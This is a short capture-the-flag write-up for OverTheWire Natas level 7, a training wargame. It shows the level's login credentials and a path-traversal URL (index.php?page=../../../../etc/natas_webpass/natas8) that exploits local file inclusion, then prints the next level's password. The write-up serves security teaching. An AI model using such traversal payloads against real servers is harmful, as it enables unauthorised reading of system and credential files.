# Natas Level 7
The ***URL*** to which you need to connect is *http://natas7.natas.labs.overthewire.org*. The ***username*** is *natas7* and the ***password*** is *7z3hEENjQtflzgnT29q7wAvMNfZdh0i9*. 

Lets check the [Home](http://natas7.natas.labs.overthewire.org/index.php?page=home) page and the [About](http://natas7.natas.labs.overthewire.org/index.php?page=about) page. We see that the variable "?page" change whenever we go to a subsite.

So RFI / LFI exploits are possible.

Lets check the viewsource of the website :
```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```
So we now know that the server is hosted on a unix / linux server we can do something like this:
http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8

BTW we don't know how many "/.." we need to write so if we add extra "/.." will have no effect.
```
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
```
